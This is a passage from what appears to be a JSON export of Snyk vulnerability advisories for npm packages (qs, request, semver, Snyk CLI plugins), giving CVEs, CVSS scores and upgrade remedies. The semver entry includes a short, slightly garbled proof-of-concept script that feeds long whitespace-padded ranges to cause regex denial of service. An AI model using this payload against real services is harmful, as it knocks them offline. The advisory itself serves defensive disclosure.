PR](https://github.com/ljharb/qs/pull/428)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2150323)\n- [Researcher Advisory](https://github.com/n8tz/CVE-2022-24999)\n",
        "created_at": "2022-12-04T11:01:47Z",
        "updated_at": "2024-03-11T09:53:59Z",
        "problems": [
          {
            "id": "CVE-2022-24999",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 6.2.4 to fix this vulnerability",
                "details": {
                  "upgrade_package": "6.2.4"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<6.2.4,>=6.3.0 <6.3.3,>=6.4.0 <6.4.1,>=6.5.0 <6.5.3,>=6.6.0 <6.6.1,>=6.7.0 <6.7.3,>=6.8.0 <6.8.3,>=6.9.0 <6.9.7,>=6.10.0 <6.10.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2022-11-26T00:00:00Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-12-04T12:24:32Z",
            "references": [
              {
                "url": "https://github.com/ljharb/qs/pull/428",
                "title": "GitHub PR"
              },
              {
                "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
                "title": "RedHat Bugzilla Bug"
              },
              {
                "url": "https://github.com/n8tz/CVE-2022-24999",
                "title": "Researcher Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-REQUEST-3361831",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Server-side Request Forgery (SSRF)",
        "description": "## Overview\n[request](https://www.npmjs.com/package/request) is a simplified http request client.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) due to insufficient checks in the `lib/redirect.js` file by allowing insecure redirects in the default configuration, via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\r\n\r\n**NOTE:** `request` package has been deprecated, so a fix is not expected. See https://github.com/request/request/issues/3142.\n## Remediation\nA fix was pushed into the `master` branch but not yet published.\n## References\n- [GitHub Commit](https://github.com/request/request/commit/d42332182512e56ba68446f49c3e3711e04301a2)\n- [GitHub Issue](https://github.com/request/request/issues/3442)\n- [GitHub PR](https://github.com/request/request/pull/3444)\n",
        "created_at": "2023-03-16T13:58:23Z",
        "updated_at": "2024-03-11T09:53:01Z",
        "problems": [
          {
            "id": "CVE-2023-28155",
            "source": "CVE"
          },
          {
            "id": "CWE-918",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2023-03-16T13:49:16Z",
            "exploit": "Proof of Concept",
            "publication_time": "2023-03-17T07:46:44Z",
            "references": [
              {
                "url": "https://github.com/request/request/commit/d42332182512e56ba68446f49c3e3711e04301a2",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/request/request/issues/3442",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/request/request/pull/3444",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SEMVER-3247795",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[semver](https://github.com/npm/node-semver) is a semantic version parser used by npm.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the function `new Range`, when untrusted user data is provided as a range.\r\n\r\n\r\n## PoC\r\n\r\n```js\r\n\r\nconst semver = require('semver')\r\nconst lengths_2 = [2000, 4000, 8000, 16000, 32000, 64000, 128000]\r\n\r\nconsole.log(\"n[+] Valid range - Test payloads\")\r\nfor (let i = 0; i =1.2.3' + ' '.repeat(lengths_2[i]) + '<1.3.0';\r\nconst start = Date.now()\r\nsemver.validRange(value)\r\n// semver.minVersion(value)\r\n// semver.maxSatisfying([\"1.2.3\"], value)\r\n// semver.minSatisfying([\"1.2.3\"], value)\r\n// new semver.Range(value, {})\r\n\r\nconst end = Date.now();\r\nconsole.log('length=%d, time=%d ms', value.length, end - start);\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `semver` to version 5.7.2, 6.3.1, 7.5.2 or higher.\n## References\n- [GitHub Commit](https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0)\n- [GitHub Commit](https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441)\n- [GitHub Commit](https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c)\n- [GitHub PR](https://github.com/npm/node-semver/pull/564)\n- [Vulnerable Code](https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104)\n- [Vulnerable Code](https://github.com/npm/node-semver/blob/main/internal/re.js#L138)\n- [Vulnerable Code](https://github.com/npm/node-semver/blob/main/internal/re.js#L160)\n",
        "created_at": "2023-01-25T16:16:50Z",
        "updated_at": "2024-03-11T09:54:01Z",
        "problems": [
          {
            "id": "CVE-2022-25883",
            "source": "CVE"
          },
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.7.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.7.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.7.2,>=6.0.0 <6.3.1,>=7.0.0 <7.5.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2023-01-25T16:00:59Z",
            "exploit": "Proof of Concept",
            "publication_time": "2023-06-20T15:39:58Z",
            "references": [
              {
                "url": "https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/npm/node-semver/pull/564",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/npm/node-semver/blob/main/classes/range.js%23L97-L104",
                "title": "Vulnerable Code"
              },
              {
                "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L138",
                "title": "Vulnerable Code"
              },
              {
                "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L160",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYK-3037342",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n[snyk](https://www.npmjs.com/package/snyk) is an advanced tool that scans and monitors projects for security vulnerabilities.\n\nAffected versions of this package are vulnerable to Command Injection via the `snyk-go-plugin` which is used by the Snyk CLI tool.\r\n\r\nA successful exploit, allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed.\r\nIn order to exploit this vulnerability, a target would have to execute the “snyk test” command on untrusted files. As developers are unlikely to run \"snyk test\" on untrusted files, an attacker might have to trick them into opening a malicious file before running \"snyk test\".\n## Remediation\nUpgrade `snyk` to version 1.996.0 or higher.\n## References\n- [GitHub Commit](https://github.com/snyk/snyk-go-plugin/commit/d8dfc11ebb185e89f62b464ebf7cdd20ecce629d)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n",
        "created_at": "2022-09-30T10:33:59Z",
        "updated_at": "2024-03-11T09:51:50Z",
        "problems": [
          {
            "id": "CVE-2022-40764",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.996.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.996.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.996.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.4,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-30T07:18:14Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-09-30T10:34:38Z",
            "references": [
              {
                "url": "https://github.com/snyk/snyk-go-plugin/commit/d8dfc11ebb185e89f62b464ebf7cdd20ecce629d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYK-3038622",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n[snyk](https://www.npmjs.com/package/snyk) is an advanced tool that scans and monitors projects for security vulnerabilities.\n\nAffected versions of this package are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342).\r\n\r\nA successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.\r\n\r\nIn order to exploit this vulnerability, a user would have to execute the `snyk test` command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.\r\n\r\nThis issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.\r\n\r\nThe issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.\n## Remediation\nUpgrade `snyk` to version 1.1064.0 or higher.\n## References\n- [GitHub Commit (CLI)](https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a)\n- [GitHub Commit (snyk-cocoapods-plugin)](https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381)\n- [GitHub Commit (snyk-docker-plugin)](https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357)\n- [GitHub Commit (snyk-gradle-plugin)](https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009)\n- [GitHub Commit (snyk-hex-plugin)](https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3)\n- [GitHub Commit (snyk-mvn-plugin)](https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50)\n- [GitHub Commit (snyk-python-plugin)](https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4)\n- [GitHub Commit (snyk-sbt-plugin)](https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-10-03T13:35:52Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-22984",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.1064.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.1064.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.1064.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-11-30T10:54:34Z",
            "references": [
              {
                "url": "https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a",
                "title": "GitHub Commit (CLI)"
              },
              {
                "url": "https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381",
                "title": "GitHub Commit (snyk-cocoapods-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357",
                "title": "GitHub Commit (snyk-docker-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009",
                "title": "GitHub Commit (snyk-gradle-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3",
                "title": "GitHub Commit (snyk-hex-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50",
                "title": "GitHub Commit (snyk-mvn-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4",
                "title": "GitHub Commit (snyk-python-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437",
                "title": "GitHub Commit (snyk-sbt-plugin)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYK-3111871",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Code Injection",
        "description": "## Overview\n\n[snyk](https://www.npmjs.com/package/snyk) is a advanced tool that scans and monitors projects for security vulnerabilities.\n\n\nAffected versions of this package are vulnerable to Code Injection.\nwhen analyzing a project. An attacker who can convince a user to scan a malicious project can include \r\ncommands in a build file such as `build.gradle` or `gradle-wrapper.jar`, which will be executed with the privileges of the application.\r\n\r\nThis vulnerability may be triggered when running the the CLI tool directly, or when running a scan with one of the IDE plugins that invoke the Snyk CLI.\r\n\r\nSuccessful exploitation of this issue would likely require some level of social engineering - to coerce an untrusted project to be downloaded and analyzed via the Snyk CLI or opened in an IDE where a Snyk IDE plugin is installed and enabled. Additionally, if the IDE has a Trust feature then the target folder must be marked as ‘trusted’ in order to be vulnerable.\r\n\r\n**NOTE:** This issue is independent of the one reported in [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342), and upgrading to a fixed version for this addresses that issue as well.\r\n\r\nThe affected IDE plugins and versions are:\r\n\r\n- VS Code - Affected: <=1.8.0, Fixed: 1.9.0\r\n- IntelliJ - Affected: <=2.4.47, Fixed: 2.4.48\r\n- Visual Studio - Affected: <=1.1.30, Fixed: 1.1.31\r\n- Eclipse - Affected: <=v20221115, Fixed: v20221130\r\n- Language Server - Affected: <=v20221109, Fixed: v20221130\n\n## Remediation\n\nUpgrade `snyk` to version 1.1064.0 or higher.\n\n\n## References\n\n- [GitHub Commit (snyk-eclipse-plugin)](https://github.com/snyk/snyk-eclipse-plugin/commit/b5a8bce25a359ced75f83a729fc6b2393fc9a495)\n\n- [GitHub Commit (snyk-intellij-plugin)](https://github.com/snyk/snyk-intellij-plugin/commit/56682f4ba6081ce1d95cb980cbfacd3809a826f4)\n\n- [GitHub Commit (snyk-ls)](https://github.com/snyk/snyk-ls/commit/b3229f0142f782871aa72d1a7dcf417546d568ed)\n\n- [GitHub Commit (snyk-visual-studio-plugin)](https://github.com/snyk/snyk-visual-studio-plugin/commit/0b53dbbd4a3153c3ef9aaf797af3b5caad0f731a)\n\n- [GitHub Commit (vscode-extension)](https://github.com/snyk/vscode-extension/commit/0db3b4240be0db6a0a5c6d02c0d4231a2c4ba708)\n\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-11-10T09:51:00Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-24441",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.1064.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.1064.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.1064.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.8,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Not Defined",
            "publication_time": "2022-11-30T10:53:43Z",
            "references": [
              {
                "url": "https://github.com/snyk/snyk-eclipse-plugin/commit/b5a8bce25a359ced75f83a729fc6b2393fc9a495",
                "title": "GitHub Commit (snyk-eclipse-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-intellij-plugin/commit/56682f4ba6081ce1d95cb980cbfacd3809a826f4",
                "title": "GitHub Commit (snyk-intellij-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-ls/commit/b3229f0142f782871aa72d1a7dcf417546d568ed",
                "title": "GitHub Commit (snyk-ls)"
              },
              {
                "url": "https://github.com/snyk/snyk-visual-studio-plugin/commit/0b53dbbd4a3153c3ef9aaf797af3b5caad0f731a",
                "title": "GitHub Commit (snyk-visual-studio-plugin)"
              },
              {
                "url": "https://github.com/snyk/vscode-extension/commit/0db3b4240be0db6a0a5c6d02c0d4231a2c4ba708",
                "title": "GitHub Commit (vscode-extension)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYKDOCKERPLUGIN-3039679",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342).\r\n\r\nA successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.\r\n\r\nIn order to exploit this vulnerability, a user would have to execute the `snyk test` command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.\r\n\r\nThis issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.\r\n\r\nThe issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.\n## Remediation\nUpgrade `snyk-docker-plugin` to version 5.6.5 or higher.\n## References\n- [GitHub Commit (CLI)](https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a)\n- [GitHub Commit (snyk-cocoapods-plugin)](https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381)\n- [GitHub Commit (snyk-docker-plugin)](https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357)\n- [GitHub Commit (snyk-gradle-plugin)](https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009)\n- [GitHub Commit (snyk-hex-plugin)](https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3)\n- [GitHub Commit (snyk-mvn-plugin)](https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50)\n- [GitHub Commit (snyk-python-plugin)](https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4)\n- [GitHub Commit (snyk-sbt-plugin)](https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n- [Snyk Blog Post](https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/)\n",
        "created_at": "2022-10-04T11:36:25Z",
        "updated_at": "2024-03-11T09:52:49Z",
        "problems": [
          {
            "id": "CVE-2022-22984",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.6.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.6.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.6.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-29T13:34:36Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-11-30T10:54:34Z",
            "references": [
              {
                "url": "https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a",
                "title": "GitHub Commit (CLI)"
              },
              {
                "url": "https://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381",
                "title": "GitHub Commit (snyk-cocoapods-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357",
                "title": "GitHub Commit (snyk-docker-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009",
                "title": "GitHub Commit (snyk-gradle-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3",
                "title": "GitHub Commit (snyk-hex-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50",
                "title": "GitHub Commit (snyk-mvn-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4",
                "title": "GitHub Commit (snyk-python-plugin)"
              },
              {
                "url": "https://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437",
                "title": "GitHub Commit (snyk-sbt-plugin)"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              },
              {
                "url": "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/",
                "title": "Snyk Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYKGOPLUGIN-3037316",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
        "description": "## Overview\n[snyk-go-plugin](https://www.npmjs.com/package/snyk-go-plugin) is a Snyk plugin that provides metadata for Golang projects.\n\nAffected versions of this package are vulnerable to Command Injection via the `snyk-go-plugin` which is used by the Snyk CLI tool.\r\n\r\nA successful exploit, allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed.\r\nIn order to exploit this vulnerability, a target would have to execute the “snyk test” command on untrusted files. As developers are unlikely to run \"snyk test\" on untrusted files, an attacker might have to trick them into opening a malicious file before running \"snyk test\".\n## Remediation\nUpgrade `snyk-go-plugin` to version 1.19.1 or higher.\n## References\n- [GitHub Commit](https://github.com/snyk/snyk-go-plugin/commit/d8dfc11ebb185e89f62b464ebf7cdd20ecce629d)\n- [Imperva Blog Post](https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/)\n",
        "created_at": "2022-09-30T07:18:29Z",
        "updated_at": "2024-03-11T09:51:50Z",
        "problems": [
          {
            "id": "CVE-2022-40764",
            "source": "CVE"
          },
          {
            "id": "CWE-77",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.19.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.19.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.19.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.4,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-30T07:18:14Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-09-30T10:34:38Z",
            "references": [
              {
                "url": "https://github.com/snyk/snyk-go-plugin/commit/d8dfc11ebb185e89f62b464ebf7cdd20ecce629d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/",
                "title": "Imperva Blog Post"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-SNYKGRADLEPLUGIN-3038624",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Command Injection",
